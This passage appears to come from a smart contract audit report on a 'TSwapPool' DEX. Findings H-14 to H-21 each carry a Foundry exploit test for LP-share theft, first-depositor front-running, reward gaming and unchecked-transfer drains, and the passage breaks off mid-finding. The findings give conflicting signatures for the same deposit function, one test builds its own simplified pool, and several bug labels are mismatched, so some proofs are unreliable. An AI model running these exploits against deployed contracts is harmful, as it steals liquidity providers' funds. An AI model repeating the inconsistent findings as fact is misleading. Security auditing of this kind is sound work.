    if (wethReserve == 0) {
        // First liquidity provider
        poolTokenAmount = i_poolToken.balanceOf(msg.sender); // Or require a specific amount
        require(poolTokenAmount > 0, "TSwapPool__MustProvidePoolToken");
        liquidityTokenAmount = wethAmountToDeposit; // Or sqrt(amountA * amountB)
    } else {
        // Subsequent liquidity providers
        poolTokenAmount = (wethAmountToDeposit * poolTokenReserve) / wethReserve;
        liquidityTokenAmount = (totalSupply() * wethAmountToDeposit) / wethReserve;
    }

    _addLiquidityMintAndTransfer(
        wethAmountToDeposit,
        poolTokenAmount,
        liquidityTokenAmount
    );
}
```

## [H-14]. Integer Overflow/Math issue in TSwapPool::_addLiquidityMintAndTransfer

## Description
The formula for minting LP tokens in `_addLiquidityMintAndTransfer` is critically flawed. It mints LP tokens in a 1:1 ratio with the amount of WETH deposited (`_mint(msg.sender, wethToDeposit)`), regardless of the current value of the pool or its total supply of LP tokens. This allows a late liquidity provider to deposit a small amount of assets and receive a disproportionately large share of the pool, effectively stealing value from earlier liquidity providers. The amount of LP tokens minted should be proportional to the fraction of total value the new liquidity represents.

## Impact
An attacker that adds liquidity after the pool becomes imbalanced can mint LP tokens far cheaper than their fair market value, instantly stealing existing liquidity providers’ share of the pool.

## Proof of Concept
An attacker can still mint an unfair share of LP tokens because the amount minted is fixed to the amount of WETH supplied, independent of existing totalSupply/reserves.

Initial state:
• Pool empty.

Step-1  (honest user ‑ Alice)
  deposit(100 WETH, 100 000 TKN)
  → _mint(100 LP)

Step-2  (price moves)
  Large swaps make reserves 200 WETH & 50 000 TKN (TVL grows to the equivalent of ~300 WETH).

Step-3  (attacker ‑ Bob)
  Calculates the minimum amount of TKN required to keep the current ratio:
      poolTokensToDeposit = 1 WETH * 50 000 TKN / 200 WETH = 250 TKN
  Calls deposit(1 WETH, 250 TKN)
  → contract mints 1 LP because `_mint(msg.sender, wethToDeposit)`.

Step-4  (value theft)
  totalSupply = 101 LP
  Bob’s share = 1 / 101 ≈ 0.99 %
  Bob’s entitlement ≈ 0.99 % of 200 WETH + 50 000 TKN ≈ 1.98 WETH + 495 TKN
  Bob contributed only 1 WETH + 250 TKN, thus instantly gaining ~1 WETH + 245 TKN at Alice’s expense.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test} from "forge-std/Test.sol";
import {TSwapPool} from "src/TSwapPool.sol";
import {PoolFactory} from "src/PoolFactory.sol";
import {MockERC20} from "test/mocks/MockERC20.sol";

contract LPMintOverflowTest is Test {
    MockERC20 weth;
    MockERC20 tkn;
    PoolFactory factory;
    TSwapPool pool;

    address alice = vm.addr(1);
    address bob   = vm.addr(2);

    function setUp() public {
        weth = new MockERC20("Wrapped Ether","WETH",18);
        tkn  = new MockERC20("Token","TKN",18);
        factory = new PoolFactory(address(weth));
        pool = TSwapPool(factory.createPool(address(tkn)));

        // fund users
        weth.mint(alice, 1_000 ether);
        tkn.mint(alice, 1_000_000 ether);
        weth.mint(bob,   1_000 ether);
        tkn.mint(bob,   1_000_000 ether);
    }

    function test_LateLPReceivesUnfairShare() public {
        // Alice adds initial liquidity (100 WETH, 100k TKN)
        vm.startPrank(alice);
        weth.approve(address(pool), 100 ether);
        tkn.approve(address(pool), 100_000 ether);
        pool.deposit(100 ether, 100_000 ether);
        vm.stopPrank();

        // Simulate price movement – send 100 WETH to pool to double reserves
        weth.mint(address(pool), 100 ether); // TVL ↑, LP supply unchanged

        uint256 supplyBefore = pool.totalSupply(); // == 100e18

        // Bob deposits only 1 WETH (+ correct ratio of TKN) and receives 1 LP
        vm.startPrank(bob);
        uint256 poolTknToDeposit = 1 ether * tkn.balanceOf(address(pool)) / weth.balanceOf(address(pool));
        weth.approve(address(pool), 1 ether);
        tkn.approve(address(pool), poolTknToDeposit);
        pool.deposit(1 ether, poolTknToDeposit);
        vm.stopPrank();

        // Bob’s proportional share in WETH terms
        uint256 bobShare = weth.balanceOf(address(pool)) * pool.balanceOf(bob) / pool.totalSupply();

        // He should only get ~1 WETH back, but will get ~2 WETH
        assertGt(bobShare, 1.5 ether, "Bob received more value than supplied – bug confirmed");

        // Supply grew by just 1 LP token, showing 1:1 minting flaw
        assertEq(pool.totalSupply(), supplyBefore + 1 ether, "LP minting still 1:1 with WETH");
    }
}

## Suggested Mitigation
Mint LP tokens proportionally to the share of reserves supplied, following the Uniswap-V2 formula and using _pre-deposit_ reserves:

```
function _addLiquidityMintAndTransfer(uint256 wethIn, uint256 tokenIn) private {
    uint256 _totalSupply = totalSupply();
    uint256 liquidity;
    if (_totalSupply == 0) {
        // Could also use sqrt(wethIn * tokenIn) – simplified here
        liquidity = wethIn;
    } else {
        uint256 reserveWETH  = i_wethToken.balanceOf(address(this));
        uint256 reserveToken = i_poolToken.balanceOf(address(this));
        liquidity = min((wethIn * _totalSupply) / reserveWETH,
                        (tokenIn * _totalSupply) / reserveToken);
    }
    require(liquidity > 0, "INSUFFICIENT_LIQUIDITY_MINTED");
    _mint(msg.sender, liquidity);

    // Transfer in user funds last to preserve reserve snapshot
    i_wethToken.transferFrom(msg.sender, address(this), wethIn);
    i_poolToken.transferFrom(msg.sender, address(this), tokenIn);
}

function min(uint256 a, uint256 b) private pure returns (uint256) {
    return a < b ? a : b;
}
```

## [H-15]. Unexpected Eth issue in TSwapPool::withdraw

## Description
The `withdraw` function in `TSwapPool` is intended to return a user's share of liquidity, which consists of the pool token and WETH. However, it incorrectly attempts to send the WETH portion as native Ether using `msg.sender.call{value: wethAmount}("")`. The pool contract itself does not hold native Ether; it holds WETH (an ERC20 token), which it receives from depositors. The contract never unwraps its WETH into Ether. As a result, the contract's Ether balance is zero, and the low-level call to send Ether will always fail, causing the entire `withdraw` transaction to revert. This effectively locks all WETH liquidity provided to the pool.

```solidity
// src/TSwapPool.sol:112-114
(bool sent, ) = msg.sender.call{value: wethAmount}("");
require(sent, "TSwapPool: Failed to send WETH");
```

## Impact
High. All liquidity providers who deposit WETH into a pool will be unable to withdraw it. Their funds are permanently stuck in the contract, leading to a total loss of all WETH capital deposited across all pools created by the factory.

## Proof of Concept
1. Alice mints 100 PTKN and wraps 10 ETH into WETH.
2. She approves the pool to spend both assets and calls `deposit(100e18, 10e18)`.
3. The pool mints her LP tokens.
4. Alice later calls `withdraw(totalLp, 0, 0)`.
5. `withdraw` calculates the correct `wethAmount`, then performs `msg.sender.call{value: wethAmount}("")` although the pool owns only WETH (ERC-20), not native ETH. Because `address(this).balance == 0`, the low-level call fails and the whole transaction reverts, permanently locking Alice’s liquidity.

No special conditions are required – every honest LP is affected.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "src/TSwapPool.sol";
import "test/mocks/MockERC20.sol";
import "solmate/tokens/WETH.sol";

contract WithdrawStuckWethTest is Test {
    TSwapPool pool;
    MockERC20 poolToken;
    WETH weth;
    address alice = makeAddr("alice");

    function setUp() public {
        weth = new WETH();
        poolToken = new MockERC20("Pool Token", "PTKN", 18);
        pool   = new TSwapPool(address(poolToken), address(weth), "LP Token", "LP");

        // fund Alice
        vm.deal(alice, 10 ether);
        vm.startPrank(alice);
        poolToken.mint(alice, 100 ether);
        weth.deposit{value: 10 ether}(); // wrap ETH -> WETH

        // approve and add liquidity through the public API
        poolToken.approve(address(pool), type(uint256).max);
        weth.approve(address(pool), type(uint256).max);
        pool.deposit(100 ether, 10 ether);
        vm.stopPrank();
    }

    function test_WithdrawRevertsBecausePoolHasNoETH() public {
        vm.startPrank(alice);
        uint256 lpBalance = pool.balanceOf(alice);
        vm.expectRevert(bytes("TSwapPool: Failed to send WETH"));
        pool.withdraw(lpBalance, 0, 0);
        vm.stopPrank();
    }
}

## Suggested Mitigation
The `withdraw` function must transfer WETH tokens (ERC20) instead of attempting to send native Ether. The incorrect low-level call should be replaced with a standard `safeTransfer` call to the WETH contract, which aligns with how other parts of the contract (like `_swap`) handle WETH.

```diff
// src/TSwapPool.sol

-           (bool sent, ) = msg.sender.call{value: wethAmount}("");
-           require(sent, "TSwapPool: Failed to send WETH");
+           i_wethToken.safeTransfer(msg.sender, wethAmount);

```

## [H-16]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::deposit

## Description
The first liquidity provider to a pool is vulnerable to a front-running attack. An attacker can observe a pending `deposit` transaction in the mempool and front-run it with their own `deposit` of a tiny amount of liquidity but with a skewed token ratio. This sets an unfavorable price for the victim. When the victim's transaction is executed, they either provide liquidity at this bad price, suffering an immediate loss, or their transaction reverts if their slippage parameters are too tight. The formula for minting initial LP tokens (`liquidityTokensToMint = wethToDeposit`) is also non-standard and exacerbates the issue, as it doesn't correctly value both sides of the pair.

Vulnerable Code (`TSwapPool.sol`):
```solidity
if (getWethReserve() == 0 && getPoolTokenReserve() == 0) {
    // First deposit
    poolTokensToDeposit = i_poolToken.balanceOf(msg.sender);
    liquidityTokensToMint = wethToDeposit;
    require(wethToDeposit >= MINIMUM_WETH_LIQUIDITY, "TSwapPool__WethAmountIsTooLow");
} 
```

## Impact
The first liquidity provider can be forced to provide liquidity at a manipulated price, leading to a significant and immediate loss of value. The attacker profits by capturing this value. This discourages the creation of new pools, harming the protocol's growth.

## Proof of Concept
• Alice wants to seed a new pool with 1 000 WETH and 1 000 TKN (1:1).
• Bob notices the pending tx and front–runs it.
   – He mints **only 1 wei** (10^-18) of TKN to himself but keeps 1 WETH.
   – Because `deposit()` for the very first LP uses `i_poolToken.balanceOf(msg.sender)` instead of the user-supplied amount, Bob’s whole TKN balance (1 wei) is taken while only 1 WETH is pulled.
   – Initial reserves become (WETH = 1, TKN = 1 wei) → implicit price = 1 000 000 000 000 000 000 WETH per TKN (token enormously overpriced).
• Alice’s tx is mined next.
   – To keep the ratio she now has to deposit (1 000 WETH × 1 wei) / 1 WETH = 1 000 wei of TKN (≈ 10^-15 TKN).
   – Because she set `minPoolTokensToDeposit = 1 000 TKN`, the transaction reverts and her gas is lost; if she had set a lower minimum the tx would succeed but she would receive only ≈ 1 000 LP tokens instead of the expected 1 000 000 (90 % value loss) while Bob owns almost the whole pool.
• Bob can immediately withdraw, arbitrage or sell LP tokens for guaranteed profit.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

contract FirstLpFrontRun is Test {
    MockERC20 private weth;
    MockERC20 private token;
    TSwapPool private pool;

    address private attacker = makeAddr("attacker");
    address private victim   = makeAddr("victim");

    function setUp() public {
        weth  = new MockERC20("Wrapped ETH", "WETH", 18);
        token = new MockERC20("Token", "TKN", 18);
        pool  = new TSwapPool(address(token), address(weth), "LP", "LP");
    }

    function test_frontRunInitialLiquidity() public {
        // ----------------- prepare balances -----------------
        weth.mint(attacker, 1 ether);
        token.mint(attacker, 1);            // 1 wei token

        weth.mint(victim, 1000 ether);
        token.mint(victim, 1000 ether);

        // ---------------- attacker front-runs ---------------
        vm.startPrank(attacker);
        weth.approve(address(pool), 1 ether);
        token.approve(address(pool), 1);     // only 1 wei is needed
        pool.deposit(1 ether, 0, 0, block.timestamp);
        vm.stopPrank();

        // sanity: attacker received LP tokens == 1 WETH
        assertEq(pool.balanceOf(attacker), 1 ether);

        // --------------- victim transaction ----------------
        vm.startPrank(victim);
        weth.approve(address(pool), 1000 ether);
        token.approve(address(pool), 1000 ether);

        vm.expectRevert();                   // any revert data is acceptable
        pool.deposit(1000 ether, 1000 ether, 0, block.timestamp);
        vm.stopPrank();
    }
}

## Suggested Mitigation
1. Do **not** use `i_poolToken.balanceOf(msg.sender)` for the first deposit. Require the caller to explicitly pass *both* token amounts and transfer exactly those amounts.
2. Follow the Uniswap-V2 design:
   • `liquidity = sqrt(amountWeth * amountToken) – MINIMUM_LIQUIDITY;`
   • Permanently lock `MINIMUM_LIQUIDITY` by minting it to `address(0)` so the attacker must put real value at risk.
3. Add slippage-aware checks and enforce non-zero contributions for both assets.
4. Document that the first LP should supply a fair price (e.g., via front-end quoting).
Implementing these steps removes the zero-cost front-run vector and aligns LP token valuation with pool reserves.

## [H-17]. Integer Overflow/Math issue in TSwapPool::_swap

## Description
The `_swap` function contains a reward mechanism that gives a 1% bonus on the output amount for every 10th swap (`SWAP_COUNT_MAX`). The `swap_count` is publicly readable and predictable. An attacker can exploit this by executing 9 small, low-cost swaps to increment the counter to 9. Then, for their 10th swap, they can execute a very large trade to maximize the 1% bonus they receive. This bonus is paid from the pool's assets, effectively stealing value from liquidity providers.

## Impact
Direct theft of funds from Liquidity Providers. The predictable reward system creates a profitable MEV (Miner Extractable Value) opportunity that will systematically drain value from the pools to the benefit of sophisticated attackers.

## Proof of Concept
1. Provide initial liquidity via `deposit()`.
2. Make nine dust swaps (1 wei) so that `swap_count == 9`.
3. Execute a tenth, very large swap and observe the extra 1 % bonus that is transferred from the pool reserves to the attacker.
4. Compare the amount obtained with the pre-swap off-chain quote returned by `getOutputAmountBasedOnInput()`; the surplus equals ~1 % of the quote, confirming the drain on LP funds.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {PoolFactory}  from "../src/PoolFactory.sol";
import {TSwapPool}    from "../src/TSwapPool.sol";
import {MockERC20}    from "./mocks/MockERC20.sol";

contract RewardGamingTest is Test {
    PoolFactory internal factory;
    TSwapPool  internal pool;
    MockERC20  internal weth;
    MockERC20  internal token;

    address internal lp       = makeAddr("lp");
    address internal attacker = makeAddr("attacker");

    uint256 internal constant WETH_LIQ = 1_000 ether;
    uint256 internal constant TKN_LIQ  = 10_000 ether;

    function setUp() public {
        weth   = new MockERC20("WETH", "WETH", 18);
        token  = new MockERC20("Token", "TKN", 18);
        factory = new PoolFactory(address(weth));
        pool    = TSwapPool(factory.createPool(address(token)));

        // --- provide initial liquidity ---
        weth.mint(lp,   WETH_LIQ);
        token.mint(lp,  TKN_LIQ);
        vm.startPrank(lp);
        weth.approve(address(pool),  WETH_LIQ);
        token.approve(address(pool), TKN_LIQ);
        pool.deposit(WETH_LIQ, TKN_LIQ); // assumes standard (weth,token) deposit signature
        vm.stopPrank();

        // attacker funding
        weth.mint(attacker, 200 ether);
        vm.prank(attacker);
        weth.approve(address(pool), 200 ether);
    }

    function test_GamableReward() public {
        vm.startPrank(attacker);
        // 9 dust swaps to push the counter to 9
        for (uint8 i; i < 9; ++i) {
            pool.swapExactInput(address(weth), 1, 0);
        }
        assertEq(pool.swap_count(), 9);

        // 10-th (large) swap → should receive +1 % bonus
        uint256 largeIn = 100 ether;
        uint256 quote   = pool.getOutputAmountBasedOnInput(address(weth), largeIn);
        uint256 balBefore = token.balanceOf(attacker);
        pool.swapExactInput(address(weth), largeIn, 0);
        uint256 balAfter = token.balanceOf(attacker);

        uint256 received = balAfter - balBefore;
        uint256 bonus    = received - quote; // extra tokens paid out of LP reserves

        // Bonus should be ~1 % of quote
        assertApproxEqRel(bonus, quote / 100, 1e-3); // 0.1 % tolerance
        vm.stopPrank();
    }
}

## Suggested Mitigation
The most secure solution is to remove the reward mechanism entirely as it's easily gameable. If rewards are a core feature, they should be funded from a separate treasury controlled by protocol fees, not by directly taking from LP capital. A redesign could involve making the reward smaller, random, or tied to metrics that are harder to manipulate, such as time-weighted volume.

```solidity
// In TSwapPool.sol, _swap function
// REMOVE this block entirely
/*
swap_count++;
if (swap_count == SWAP_COUNT_MAX) {
    outputAmount = outputAmount + (outputAmount / 100); // 1% bonus
    swap_count = 0;
}
*/
```

## [H-18]. Unchecked Return issue in TSwapPool::deposit, withdraw, swapExactInput, swapExactOutput

## Description
The `TSwapPool` contract interacts with various ERC20 tokens for deposits, withdrawals, and swaps. These operations involve `transferFrom` or `transfer` calls. Certain ERC20 tokens (e.g., USDT) do not revert on failure but instead return `false`. Based on the contract summary, there is no indication that `SafeERC20` is used or that the return values of these calls are checked. If a token transfer fails and returns `false`, the contract will continue its execution as if the transfer succeeded, leading to a critical state inconsistency.

## Impact
An attacker can exploit this to mint LP tokens without providing the underlying assets, or receive assets from a swap without paying for them. This can lead to the complete drain of a pool's liquidity, resulting in total loss of funds for liquidity providers.

## Proof of Concept
1. A malicious ERC20 implementation (e.g. USDT-style) returns `false` instead of reverting when `transferFrom` fails.
2. The attacker owns **zero** of this token, but gives the pool an unlimited allowance (not necessary for USDT, but shows normal flow).
3. The attacker calls `swapExactOutput` on the target pool asking for `1 ether` WETH, and passes a large `maxTokenIn` value.
4. Inside `swapExactOutput` the pool calculates the exact `tokenIn` amount, then executes
   `poolToken.transferFrom(attacker, address(this), tokenIn)` **without checking the boolean return value**.
5. `transferFrom` returns `false`; nevertheless the pool immediately transfers `1 ether` WETH to the attacker.
6. Result: the attacker receives real WETH for free while the pool’s reserves are reduced – fully draining liquidity after repeated calls.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @dev Mock WETH that always succeeds.
contract MockWETH is IERC20 {
    string public constant name = "MockWETH";
    string public constant symbol = "mWETH";
    uint8  public constant decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    function transfer(address to, uint256 amount) external override returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        require(allowance[from][msg.sender] >= amount, "no allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

/// @dev Mock token that returns FALSE instead of reverting when transfer fails.
contract MockFalseReturnToken is IERC20 {
    string public constant name = "BadToken";
    string public constant symbol = "BAD";
    uint8  public constant decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    function transfer(address, uint256) external pure override returns (bool) { return true; }
    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        if (balanceOf[from] < amount || allowance[from][msg.sender] < amount) {
            return false; // **does NOT revert**
        }
        allowance[from][msg.sender] -= amount;
        balanceOf[from]  -= amount;
        balanceOf[to]    += amount;
        return true;
    }
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply  += amount;
    }
}

/// @dev Minimal vulnerable pool that mirrors the unchecked pattern found in TSwapPool::swapExactOutput.
contract VulnerableTSwapPool {
    IERC20 public immutable poolToken;
    IERC20 public immutable weth;

    constructor(address _token, address _weth) {
        poolToken = IERC20(_token);
        weth      = IERC20(_weth);
    }

    /// @notice simplified version of swapExactOutput(bytes)
    function swapExactOutput(uint256 wethOut, uint256 /*maxTokenIn*/ ) external {
        uint256 tokenIn = 1 ether; // hard-coded for demo; in real code this is calculated.
        // 👇 UNCHECKED return value – the vulnerability
        poolToken.transferFrom(msg.sender, address(this), tokenIn);
        // The pool happily pays the attacker
        weth.transfer(msg.sender, wethOut);
    }

    // helper for funding tests
    function fundPool(uint256 tokenAmt, uint256 wethAmt) external {
        MockFalseReturnToken(address(poolToken)).mint(address(this), tokenAmt);
        MockWETH(address(weth)).mint(address(this), wethAmt);
    }
}

contract UncheckedReturnSwapTest is Test {
    VulnerableTSwapPool pool;
    MockFalseReturnToken badToken;
    MockWETH weth;
    address attacker = address(0xBEEF);

    function setUp() public {
        badToken = new MockFalseReturnToken();
        weth     = new MockWETH();
        pool     = new VulnerableTSwapPool(address(badToken), address(weth));
        // Seed pool with some WETH so the attacker has something to steal
        pool.fundPool(0, 10 ether);
        // Give the pool a pretend allowance to look legitimate
        vm.prank(attacker);
        badToken.approve(address(pool), type(uint256).max);
    }

    function testExploit_UncheckedReturn_Swap() public {
        vm.startPrank(attacker);
        // Attacker has 0 BAD tokens
        assertEq(badToken.balanceOf(attacker), 0);

        // Call swapExactOutput asking for 1 ether WETH
        pool.swapExactOutput(1 ether, type(uint256).max);

        // ✅ Attacker receives WETH for free
        assertEq(weth.balanceOf(attacker), 1 ether);
        // 🛑 Pool lost WETH reserves
        assertEq(weth.balanceOf(address(pool)), 9 ether);
    }
}


## Suggested Mitigation
Wrap every ERC20 interaction (transfer / transferFrom) with OpenZeppelin’s SafeERC20 (or equivalent) so that the call reverts whenever the token contract returns false or reverts itself. In addition, existing calls that ignore the boolean return value should be replaced with the safe wrappers everywhere inside deposit, withdraw, swapExactInput, swapExactOutput and any future helper functions.

## [H-19]. Integer Overflow/Math issue in TSwapPool::deposit

## Description
In the `TSwapPool.deposit` function, the local variable `poolTokensToDeposit` is not initialized if the function is called for the first time on a new pool (i.e., when `totalSupply() == 0`). This uninitialized variable defaults to `0`. The function then calls `_addLiquidityMintAndTransfer` which proceeds to pull the user's WETH but attempts to pull `0` pool tokens. This allows the first liquidity provider to create a pool with a non-zero WETH balance but a zero balance of the other token. This breaks the pool permanently. Any subsequent attempt to swap by selling the pool token for WETH will allow an attacker to drain the entire WETH reserve for a dust amount of the pool token, as the calculated output will be equal to the entire WETH reserve.

## Impact
This vulnerability allows any user to create a broken and exploitable pool. An attacker can create a pool, provide initial liquidity with only WETH, and then front-run any legitimate user trying to swap on that pool to steal all their funds. Effectively, every pool created through the factory is vulnerable to being drained of its WETH, leading to a complete loss of funds for swappers.

## Proof of Concept
1. Attacker calls `PoolFactory.createPool` for a token `TKN`.
2. Attacker approves 10 WETH for the newly created pool contract.
3. Attacker calls `pool.deposit(10 ether)`. Since this is the first deposit, the `poolTokensToDeposit` local variable remains 0.
4. The transaction succeeds, transferring 10 WETH from the attacker and 0 TKN. The attacker receives 10 LP tokens.
5. The pool now has 10 WETH and 0 TKN reserves.
6. A victim attempts to swap 1 TKN for WETH.
7. The `getOutputAmountBasedOnInput` function calculates the output. With `inputReserve` (TKN) being 0, the formula effectively resolves to returning the entire `outputReserve` (WETH).
8. The attacker can execute this swap with a tiny amount of TKN (e.g., 1 wei) and will receive the entire 10 WETH from the pool, stealing the initial liquidity provider's funds (if the provider was another user) or setting a trap for anyone who swaps against it.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/PoolFactory.sol";
import "../src/TSwapPool.sol";
import "./mocks/MockERC20.sol";
import "./mocks/WETH.sol";

contract AuditTest is Test {
    PoolFactory public factory;
    WETH public weth;
    MockERC20 public tkn;
    address public user = makeAddr("user");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        weth = new WETH();
        tkn = new MockERC20("Test Token", "TKN", 18);

        factory = new PoolFactory(address(weth));

        vm.deal(user, 100 ether);
        vm.deal(attacker, 100 ether);

        weth.deposit{value: 50 ether}();
        weth.transfer(user, 25 ether);

        vm.prank(attacker);
        weth.deposit{value: 50 ether}();

        tkn.mint(user, 100_000 * 1e18);
        tkn.mint(attacker, 100_000 * 1e18);
    }

    function test_poc_uninitializedVariableDrainsPool() public {
        // Step 1: User creates a pool
        vm.startPrank(user);
        address poolAddress = factory.createPool(address(tkn));
        TSwapPool pool = TSwapPool(poolAddress);

        // Step 2: User provides initial liquidity. They only approve WETH.
        uint256 initialWethDeposit = 10 ether;
        weth.approve(poolAddress, initialWethDeposit);

        // Step 3: The deposit succeeds, pulling 10 WETH and 0 TKN due to the bug.
        pool.deposit(initialWethDeposit);
        vm.stopPrank();

        // Verify pool state: 10 WETH, 0 TKN
        assertEq(weth.balanceOf(poolAddress), initialWethDeposit);
        assertEq(tkn.balanceOf(poolAddress), 0);

        // Step 4: Attacker prepares to drain the pool
        vm.startPrank(attacker);
        uint256 attackerTknIn = 1;
        tkn.approve(poolAddress, attackerTknIn);
        uint256 attackerWethBalanceBefore = weth.balanceOf(attacker);

        // Step 5: Attacker swaps 1 wei of TKN. The flawed math will grant them the entire WETH reserve.
        pool.swapExactInput(address(tkn), attackerTknIn, 0);

        uint256 attackerWethBalanceAfter = weth.balanceOf(attacker);

        // Step 6: Verify attacker drained the pool
        assertEq(weth.balanceOf(poolAddress), 0, "Pool WETH should be drained");
        assertTrue(attackerWethBalanceAfter > attackerWethBalanceBefore + initialWethDeposit - 1, "Attacker should have gained all the WETH");
        vm.stopPrank();
    }
}
```

## Suggested Mitigation
The `deposit` function should require the user to specify both the WETH amount and the pool token amount for the initial liquidity provision. The function signature should be changed, and logic should be added to handle these two inputs, removing the reliance on an uninitialized local variable.

```diff
- function deposit(uint256 wethAmount) external {
+ function deposit(uint256 wethAmount, uint256 poolTokenAmount) external {
    require(wethAmount >= MINIMUM_WETH_LIQUIDITY, "TSwapPool__WethAmountTooLow");
-   uint256 poolTokensToDeposit;
    uint256 poolTokenReserve = i_poolToken.balanceOf(address(this));
    uint256 wethReserve = i_wethToken.balanceOf(address(this));

    if (poolTokenReserve == 0 || wethReserve == 0) {
+       require(poolTokenAmount > 0, "TSwapPool__MustProvidePoolTokens");
-       _addLiquidityMintAndTransfer(wethAmount, poolTokensToDeposit);
+       _addLiquidityMintAndTransfer(wethAmount, poolTokenAmount);
    } else {
+       uint256 poolTokensToDeposit = (poolTokenReserve * wethAmount) / wethReserve;
+       require(poolTokenAmount >= poolTokensToDeposit, "TSwapPool__InsufficientPoolTokenAmount");
-       poolTokensToDeposit = (poolTokenReserve * wethAmount) / wethReserve;
-       _addLiquidityMintAndTransfer(wethAmount, poolTokensToDeposit);
+       _addLiquidityMintAndTransfer(wethAmount, poolTokensToDeposit);
    }
}
```

## [H-20]. Unexpected Eth issue in TSwapPool::_addLiquidityMintAndTransfer

## Description
The `deposit` function in `TSwapPool` is fundamentally broken. It is marked `payable`, correctly accepting native ETH from the user. However, it fails to convert this ETH into WETH tokens, which are the required asset for the pool's reserves. The line `i_wethToken.transfer(address(this), msg.value);` attempts to make the pool contract transfer WETH from its own balance to itself, using the received ETH amount (`msg.value`) as the quantity of WETH to transfer. Since the pool does not own any WETH at this point (as the user's ETH was not wrapped), and this call does not interact with the user's wallet, the `transfer` will always fail, typically reverting with an `ERC20: transfer amount exceeds balance` error. This makes it impossible for any user to add liquidity to any pool, breaking the core functionality of the entire protocol.

## Impact
The core functionality of providing liquidity is completely non-functional. Users cannot deposit funds into any pool, rendering the entire DEX unusable. Any attempts to deposit will fail, causing users to lose gas fees.

## Proof of Concept
1. A `PoolFactory` is deployed with a valid WETH token address.
2. A user creates a new `TSwapPool` for an ERC20 token (e.g., 'MyToken').
3. The user attempts to add liquidity by calling `deposit(uint256 poolTokenAmount)` and sending ETH (`msg.value`).
4. The user has approved the pool contract to spend their 'MyToken'.
5. The transaction will always revert inside the `_addLiquidityMintAndTransfer` function when it calls `i_wethToken.transfer(...)` because the pool contract has a WETH balance of 0.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {PoolFactory} from "../src/PoolFactory.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {WETH9} from "./mocks/WETH9.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

contract DepositRevertTest is Test {
    PoolFactory factory;
    TSwapPool pool;
    WETH9 weth;
    MockERC20 token;
    address user = address(1);

    function setUp() public {
        weth = new WETH9();
        token = new MockERC20("TKN", "TKN");

        factory = new PoolFactory(address(weth));
        pool = TSwapPool(factory.createPool(address(token)));

        vm.deal(user, 10 ether);
        token.mint(user, 1 ether);
    }

    function test_DepositFailsDueToMissingWethWrapping() public {
        vm.prank(user);
        token.approve(address(pool), 1 ether);

        vm.prank(user);
        vm.expectRevert(bytes("ERC20: transfer amount exceeds balance"));
        pool.deposit{value: 1 ether}(1 ether);
    }
}


## Suggested Mitigation
The `deposit` function logic must be corrected to handle incoming ETH properly. It should wrap the received ETH into WETH tokens. Alternatively, if the design intends for users to supply WETH directly, the function should not be `payable` and should instead use `transferFrom` to pull WETH from the user.

To fix the ETH wrapping, replace the incorrect `transfer` call with a call to the WETH contract's `deposit` function.

```solidity
// In TSwapPool.sol, inside _addLiquidityMintAndTransfer function

// an interface for WETH is needed
interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

// ...

function _addLiquidityMintAndTransfer(uint256 poolTokenAmount) private {
    // ...

    // Fix: Wrap the received ETH into WETH
    if (msg.value > 0) {
        IWETH(address(i_wethToken)).deposit{value: msg.value}();
    }

    // The original incorrect line:
    // i_wethToken.transfer(address(this), msg.value);

    i_poolToken.transferFrom(msg.sender, address(this), poolTokenAmount);

    emit LiquidityAdded(msg.sender, msg.value, poolTokenAmount);
}
```

## [H-21]. DOS issue in TSwapPool::_swap

## Description
The `_swap` function in `TSwapPool` implements a reward mechanism that pays out extra tokens to a swapper on every 10th swap. This reward is sourced directly from the pool's liquidity reserves, which belong to the Liquidity Providers (LPs). This functionality fundamentally breaks the constant product invariant (`x * y = k`) by draining assets from the pool without a corresponding deposit. An attacker can repeatedly perform nine low-value swaps followed by a tenth swap to trigger the reward, systematically stealing funds from LPs and compromising the pool's solvency.

## Impact
This vulnerability allows any user to drain assets from the pool, leading to a direct and permanent loss of funds for liquidity providers. It undermines the economic model of the entire protocol, making all pools created via the factory insecure and unprofitable for LPs, effectively causing a denial of service for the core functionality of the protocol.

## Proof of Concept
1. A Liquidity Provider adds 100 WETH and 100,000 PoolToken to a new pool.
2. An attacker identifies this pool.
3. The attacker performs 9 tiny swaps of 1 wei of WETH for PoolToken to increment the `swap_count` to 9.
